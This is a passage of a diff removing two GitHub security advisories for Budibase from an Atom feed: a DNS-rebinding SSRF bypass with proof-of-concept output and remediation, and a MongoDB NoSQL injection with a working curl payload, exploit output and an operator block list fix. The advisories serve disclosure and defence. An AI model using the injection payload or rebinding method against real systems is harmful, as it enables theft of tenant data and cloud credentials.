-npx esbuild entry.ts --bundle --platform=node --format=cjs --outfile=entry.cjs
-node entry.cjs
-</code></pre>
-<p><strong>Expected output</strong> (the port is the only variable):</p>
-<pre><code>[*] internal service 127.0.0.1:&lt;random&gt;; guard validates host -&gt; 203.0.113.10 (safe), pins to it
-(A) REST/undici path  -&gt; status 200 body=INTERNAL_SECRET_RESPONSE
-(B) node-fetch path   -&gt; ERROR Failed to connect to resolved IP for localhost: network timeout at: http://localhost:&lt;random&gt;/
-
-RESULT: PASS - undici path BYPASSES guard, node-fetch path CONTAINED
-</code></pre>
-<p><strong>How to read it:</strong></p>
-<ul>
-<li><strong>(A)</strong> the real <code>fetchWithBlacklist</code> validated and pinned the safe public IP <code>203.0.113.10</code>, yet the undici REST transport re-resolved <code>localhost</code> and reached <code>127.0.0.1</code> — the internal service responded → <strong>SSRF bypass</strong>.</li>
-<li><strong>(B)</strong> the default node-fetch path honored the pin (forced to the unroutable <code>203.0.113.10</code>) and never reached the internal service. The <code>"Failed to connect to resolved IP for localhost"</code> string is emitted by the real <code>outboundFetch.ts</code>, proving the pin works there. This is the negative control localizing the bug to the undici transport.</li>
-</ul>
-<p><strong>Real-world variant:</strong> instead of <code>localhost</code>, an attacker uses a domain they control with a 0-second TTL that returns a public IP during the guard's validation lookup and an internal IP (<code>169.254.169.254</code>, <code>127.0.0.1</code>, internal CouchDB/Redis) at undici's connect-time lookup; the REST datasource query then returns the internal response body to the attacker.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Type:</strong> Server-Side Request Forgery via DNS rebinding (CWE-918 + CWE-367), full-response and with arbitrary HTTP method/body (REST datasources let the caller choose method, headers, and body).</p>
-<p><strong>Who is impacted:</strong> Any Budibase deployment on an affected version, especially multi-tenant / Budibase-Cloud-style hosting where builders/tenants are not trusted with host-internal access. The SSRF blacklist is the control that contains those users; this bypass defeats it.</p>
-<p><strong>Realistic worst case:</strong> An authenticated builder/tenant points a REST datasource at a rebinding host and makes the server:</p>
-<ul>
-<li>read cloud metadata (<code>http://169.254.169.254/...</code>) → steal IAM credentials → <strong>cloud account compromise</strong>;</li>
-<li>read the internal CouchDB (<code>http://127.0.0.1:5984/_all_dbs</code>, <code>_users</code>) → <strong>all tenants' apps, users, and secrets</strong>;</li>
-<li>using <code>PUT</code>/<code>POST</code>/<code>DELETE</code> against unauthenticated localhost services → create admin documents, modify or <strong>delete</strong> tenant databases / flush caches → integrity and availability loss for all co-tenants.</li>
-</ul>
-<h3 id="cvss-31-vector-justification">CVSS 3.1 Vector Justification</h3>
-<table>
-<thead>
-<tr>
-<th>Metric</th>
-<th>Value</th>
-<th>Why</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Attack Vector (AV)</td>
-<td>Network (N)</td>
-<td>Triggered through Budibase's HTTP API / app (a REST datasource query).</td>
-</tr>
-<tr>
-<td>Attack Complexity (AC)</td>
-<td>High (H)</td>
-<td>Requires DNS rebinding — the validation-time IP must differ from the connect-time IP (TOCTOU). A direct internal request without rebinding is blocked by the blacklist, so the race is mandatory.</td>
-</tr>
-<tr>
-<td>Privileges Required (PR)</td>
-<td>Low (L)</td>
-<td>Requires an authenticated account that can configure/run a REST datasource (builder/tenant).</td>
-</tr>
-<tr>
-<td>User Interaction (UI)</td>
-<td>None (N)</td>
-<td>The attacker configures and triggers the request; no victim interaction.</td>
-</tr>
-<tr>
-<td>Scope (S)</td>
-<td>Changed (C)</td>
-<td>Canonical SSRF: the vulnerable component is abused to reach resources in other security authorities (cloud metadata, internal CouchDB/Redis/MinIO).</td>
-</tr>
-<tr>
-<td>Confidentiality (C)</td>
-<td>High (H)</td>
-<td>Full-response SSRF: read cloud IAM credentials and the internal CouchDB (every tenant's apps, users, secrets).</td>
-</tr>
-<tr>
-<td>Integrity (I)</td>
-<td>High (H)</td>
-<td>Arbitrary method/body allows <code>PUT</code>/<code>POST</code>/<code>DELETE</code> to unauthenticated localhost services (CouchDB <code>:5984</code>) → create admin docs, modify tenant data.</td>
-</tr>
-<tr>
-<td>Availability (A)</td>
-<td>High (H)</td>
-<td>The same write primitive can <code>DELETE</code> databases / flush Redis → full data/service loss for all tenants.</td>
-</tr>
-</tbody></table>
-<p><strong>Notes:</strong> AC:H is the standard, defensible scoring for DNS rebinding; if rebinding is treated as reliable (TTL-0 frameworks), <code>AC:L</code> yields <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code>. A conservative read-only interpretation  is <code>I:N/A:N</code>.</p>
-<h3 id="suggested-remediation">Suggested remediation</h3>
-<p>Make the transport that actually performs the request honor the validated IP. In <code>getDispatcher</code>/<code>rest.ts</code>, construct the undici <code>Agent</code> with a <code>connect: { lookup }</code> (or custom <code>connect</code>) that returns <strong>only</strong> the <code>pinnedIp</code> resolved by <code>fetchWithBlacklist</code> (i.e., mirror <code>makePinnedAgent</code> for undici), so the dispatcher cannot re-resolve DNS; alternatively, re-check the resolved peer IP against <code>isBlacklisted</code> inside the undici <code>connect</code> callback. The Node-<code>agent</code> pin must not be relied upon when the request is issued through undici.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-v42f-v8xc-j435">https://github.com/Budibase/budibase/security/advisories/GHSA-v42f-v8xc-j435</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/19178">https://github.com/Budibase/budibase/pull/19178</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/1fecb3fc3497e8db7b60b42cc514ce304ffe3a41">https://github.com/Budibase/budibase/commit/1fecb3fc3497e8db7b60b42cc514ce304ffe3a41</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/5758bdb242802ca20c4ed0dc579e4330ee898ef3">https://github.com/Budibase/budibase/commit/5758bdb242802ca20c4ed0dc579e4330ee898ef3</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/586802b5706367520d14245e18a7d0cabab0be11">https://github.com/Budibase/budibase/commit/586802b5706367520d14245e18a7d0cabab0be11</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.30">https://github.com/Budibase/budibase/releases/tag/3.39.30</a></li>
-<li><a href="https://github.com/advisories/GHSA-v42f-v8xc-j435">https://github.com/advisories/GHSA-v42f-v8xc-j435</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v42f-v8xc-j435</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-24T21:44:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: NoSQL injection in MongoDB integration: collection dump, $where JS exec, cross-collection pivot, arbitrary update/delete]]></title>
-        <id>https://github.com/advisories/GHSA-pmpg-2mxq-6xwr</id>
-        <link href="https://github.com/advisories/GHSA-pmpg-2mxq-6xwr"/>
-        <updated>2026-07-24T21:43:34.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>An end-user injection in Budibase's MongoDB datasource lets any BASIC app user bypass the builder's query-level access controls. Builders scope MongoDB reads per-user with bindings like <code>{"email": "{{ currentUser.email }}"}</code> so each app user only sees their own rows. Because the binding is handlebars-enriched into the query JSON with <code>noEscaping: true</code> and then <code>JSON.parse</code>d, Bob (a BASIC user) overrides the builder's filter with a MongoDB operator and reads every document the connection can touch. SQL datasources are parameterized through <code>interpolateSQL()</code>; the MongoDB path has no equivalent, so the scoping pattern Budibase's own docs show is unsafe.</p>
-<h2 id="details">Details</h2>
-<h3 id="enrichment">Enrichment</h3>
-<p><code>packages/server/src/sdk/workspace/queries/queries.ts:105-125</code> enriches every string field of the query with handlebars, then parses the enriched <code>json</code> field:</p>
-<pre><code class="language-typescript">enrichedQuery[key] = processStringSync(fields[key], parameters, {
-  noEscaping: true,
-  noHelpers: true,
-  escapeNewlines: true,
-})
-// ...
-enrichedQuery.json = JSON.parse(
-  enrichedQuery.json || enrichedQuery.customData || enrichedQuery.requestBody
-)
-</code></pre>
-<p><code>noEscaping: true</code> turns <code>{{name}}</code> into <code>{{{name}}}</code>, which Handlebars renders without HTML-escaping. Any <code>"</code> or <code>}</code> the attacker supplies lands verbatim in the enriched string. <code>JSON.parse</code> then produces a structured object whose top-level keys and operators came from the parameter value.</p>
-<h3 id="execution">Execution</h3>
-<p><code>packages/server/src/integrations/mongodb.ts:499-512</code>:</p>
-<pre><code class="language-typescript">async read(query: MongoDBQuery) {
-  try {
-    await this.connect()
-    const db = this.client.db(this.config.db)
-    const collection = db.collection(query.extra.collection)
-    let json = this.createObjectIds(query.json)
-    switch (query.extra.actionType) {
-      case "find": {
-        if (json) {
-          return await collection.find(json).toArray()
-        }
-</code></pre>
-<p><code>createObjectIds</code> walks the object and rewrites strings that look like <code>ObjectId(...)</code>. It does not strip <code>$</code>-prefixed keys and does not reject operator-shaped values. The injected filter reaches <code>collection.find</code> unchanged.</p>
-<p>For comparison, SQL datasources go through <code>interpolateSQL</code> at <code>packages/server/src/threads/query.ts:145</code>, which parameterizes bindings into driver-level bind variables. The MongoDB path has no equivalent.</p>
-<h3 id="duplicate-key-trick">Duplicate-key trick</h3>
-<p>The template gives the attacker one substitution point inside the <code>name</code> value. The outer <code>{"name": "</code> / <code>"}</code> is fixed. The attacker's payload:</p>
-<pre><code>x", "name": {"$ne": "x"}, "$comment": "bud-033
-</code></pre>
-<p>Renders to:</p>
-<pre><code class="language-json">{"name": "x", "name": {"$ne": "x"}, "$comment": "bud-033"}
-</code></pre>
-<p><code>JSON.parse</code> keeps the last value for a duplicate key (ECMA-404 leaves this implementation-defined; V8 and Node's <code>JSON.parse</code> keep the last), so the parsed object is:</p>
-<pre><code class="language-js">{ name: { $ne: "x" }, $comment: "bud-033" }
-</code></pre>
-<p><code>$comment</code> is a MongoDB meta operator that the server accepts and ignores, so it consumes the template's trailing <code>"}</code> without restricting the query. The filter that reaches MongoDB is <code>name != "x"</code>, which matches every document.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Tested against Budibase 3.35.8 (master at f960e361) and MongoDB 6.</p>
-<p>Step 1: Admin creates a MongoDB datasource and seeds three documents:</p>
-<pre><code class="language-bash">docker run -d --name mongo -p 27017:27017 mongo:6
-docker exec mongo mongosh --quiet --eval '
-  db = db.getSiblingDB("testdb");
-  db.users.insertMany([
-    {name:"alice", email:"alice@x.com", secret:"public-alice"},
-    {name:"bob",   email:"bob@x.com",   secret:"PRIVATE-BOB"},
-    {name:"eve",   email:"eve@x.com",   secret:"PRIVATE-EVE"}
-  ]);'
-</code></pre>
-<p>Step 2: Alice, a builder, configures the datasource and writes a MongoDB query <code>find-by-name</code> whose <code>json</code> field is <code>{"name": "{{name}}"}</code>. She publishes the app and grants Bob (BASIC) a role on it.</p>
-<p>Step 3: Bob, logged in as BASIC with a role on the published app, executes the query via the standard execute endpoint. <code>POST /api/queries/:queryId</code> is reachable by any app role with permission on the query (it is how Budibase renders query-backed tables to end users):</p>
-<pre><code class="language-bash">curl -sS -b "$BOB_COOKIE" -X POST "$BASE/api/queries/$QUERY_ID" \
-  -H "Content-Type: application/json" -H "x-budibase-app-id: $PROD_APP" \
-  -d '{"parameters":{"name":"x\", \"name\": {\"$ne\": \"x\"}, \"$comment\": \"bud-033"}}'
-</code></pre>
-<p>Legitimate <code>name=alice</code> returned only Alice:</p>
-<pre><code class="language-json">[{"_id":"...","name":"alice","email":"alice@x.com","secret":"public-alice"}]
-</code></pre>
-<p>The injection payload returned all three documents:</p>
-<pre><code class="language-json">[
-  {"_id":"...","name":"alice","email":"alice@x.com","secret":"public-alice"},
-  {"_id":"...","name":"bob",  "email":"bob@x.com",  "secret":"PRIVATE-BOB"},
-  {"_id":"...","name":"eve",  "email":"eve@x.com",  "secret":"PRIVATE-EVE"}
-]
-</code></pre>
-<p>MongoDB's profiling confirmed the filter that reached the server:</p>
-<pre><code class="language-json">{"find":"users","filter":{"name":{"$ne":"never-matches"},"$comment":"bud-033"}}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>The builder's per-user filter collapses. A BASIC end-user who is only meant to read their own documents reads everyone's.</p>
-<p>Concrete scenario: builder publishes an app whose "My records" screen runs a MongoDB query with <code>json</code> = <code>{"email": "{{ currentUser.email }}"}</code>. Each app user is supposed to see only the rows where <code>email</code> matches their session. Bob, a BASIC user in that app, sends <code>bob@x.com", "email": {"$ne": "x"}, "$comment": "x</code> as the <code>currentUser.email</code> binding replacement and receives every row in the collection, including other tenants' users, admin records, and any secret fields the builder stored alongside.</p>
-<p>The blast radius depends on what the builder exposed:</p>
-<ul>
-<li><strong>Read queries</strong>: full-collection dump (demonstrated above: three docs returned where the scoped filter returned one, including other users' secrets).</li>
-<li><strong><code>$where</code> operator</strong>: arbitrary JavaScript inside the MongoDB server process. The attacker exfiltrates any field of any document through the JS expression or via timing side channels.</li>
-<li><strong><code>$function</code> / <code>$accumulator</code></strong> (MongoDB 4.4+): arbitrary JS in aggregation stages.</li>
-<li><strong><code>$lookup</code></strong>: cross-collection joins within the same database. If the MongoDB datasource holds admin tokens or sensitive collections next to the one the builder queried, the injection reaches them.</li>
-<li><strong><code>update</code> / <code>delete</code> action types</strong>: the filter injection rewrites the affected-document set. One request wipes or rewrites every document the connection can reach.</li>
-</ul>
-<p>The blast radius is the builder's own MongoDB deployment, not Budibase infrastructure. Budibase does not ship or run MongoDB; this connector talks to the customer's external Mongo, so the attacker reads and writes data the builder's connection has access to and does not cross into Budibase's tenant boundary, CouchDB, MinIO, or Redis. The vulnerable pattern (<code>{{binding}}</code> inside the JSON body) is the exact shape Budibase's documentation shows for parameterized MongoDB queries, and there is no in-product warning that MongoDB behaves differently from SQL. CVSS reflects the common read-query scope (filter bypass on a single collection); the <code>$where</code> / <code>$lookup</code> / write-action paths exist but depend on what primitives the builder exposed.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Strip <code>$</code>-prefixed keys from any object that originates from user-controlled parameters before it reaches <code>collection.find</code>/<code>updateOne</code>/<code>deleteOne</code>. A single guard in <code>createObjectIds</code> covers the read, update, and delete paths:</p>
-<pre><code class="language-typescript">// packages/server/src/integrations/mongodb.ts:394 (createObjectIds)
-const DANGEROUS = new Set([
-  "$where", "$function", "$accumulator",
-  "$expr", "$regex", "$ne", "$nin", "$gt", "$gte", "$lt", "$lte",
-  "$or", "$and", "$nor", "$not", "$exists", "$type", "$mod",
-  "$text", "$comment",
-])
-
-function stripOperators(obj: any): any {
-  if (obj === null || typeof obj !== "object") return obj
-  if (Array.isArray(obj)) return obj.map(stripOperators)
-  const cleaned: Record&lt;string, any&gt; = {}
-  for (const [k, v] of Object.entries(obj)) {
-    if (DANGEROUS.has(k)) continue
-    cleaned[k] = stripOperators(v)
-  }
-  return cleaned
-}
-</code></pre>
-<p>A safer fix mirrors the SQL path: introduce a MongoDB-aware enrichment that binds parameters as values instead of string-substituting them into the query JSON. That eliminates the whole class.</p>
-<hr>
-<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-pmpg-2mxq-6xwr">https://github.com/Budibase/budibase/security/advisories/GHSA-pmpg-2mxq-6xwr</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/18907">https://github.com/Budibase/budibase/pull/18907</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/dd8c0654b35cd89ce3645f2355f4bf2ff9a5dd80">https://github.com/Budibase/budibase/commit/dd8c0654b35cd89ce3645f2355f4bf2ff9a5dd80</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.9">https://github.com/Budibase/budibase/releases/tag/3.39.9</a></li>
-<li><a href="https://github.com/advisories/GHSA-pmpg-2mxq-6xwr">https://github.com/advisories/GHSA-pmpg-2mxq-6xwr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pmpg-2mxq-6xwr</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-24T21:43:34.000Z</published>
     </entry>
 </feed>
